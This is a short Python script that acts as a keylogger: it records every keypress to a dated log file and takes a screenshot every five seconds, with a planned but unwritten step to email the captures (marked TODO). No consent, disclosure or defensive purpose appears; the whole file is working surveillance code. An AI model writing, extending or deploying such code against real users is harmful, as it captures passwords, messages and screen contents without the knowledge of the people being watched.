from pynput import keyboard
from datetime import date, datetime, timedelta
import pyautogui
from win_file import create_folder

keys = []
curr_date = date.today()
date_str = curr_date.strftime("%d-%m-%Y")

def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(
            key.char))
    except AttributeError:
        print('special key {0} pressed'.format(
            key))

def on_release(key):
    print('{0} released'.format(
        key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    
def write_file(keys):
    path = create_folder() 

    with open(f'{path}/logs/{date_str}.log', 'w') as f:
        for key in keys:
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
                     
            # explicitly adding a space after
            # every keystroke for readability
            f.write(' ')

def screenshot():
    path = create_folder()
    
    curr_date_time = datetime.now()
    dt_string = curr_date_time.strftime("%d-%m-%Y_%H-%M-%S")
    
    ss = pyautogui.screenshot()
    ss.save(f'{path}/screenshots/{dt_string}.jpg')

# Start up the listener
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

# Initialize timekeeping variables for screenshots
last_ss_time = datetime.utcnow()

# initialize some timeframes
screenshot_interval = 5
email_interval = 60 * 5

# Main loop to check timestamps for screenshots and email sending
while True:
    curr_time = datetime.utcnow()
    print(curr_time - last_ss_time)
    
    # Check if it's time to screenshot
    if (curr_time - last_ss_time) > timedelta(seconds=screenshot_interval):
        screenshot()
        last_ss_time = curr_time

    # Check if its time to email
    # TODO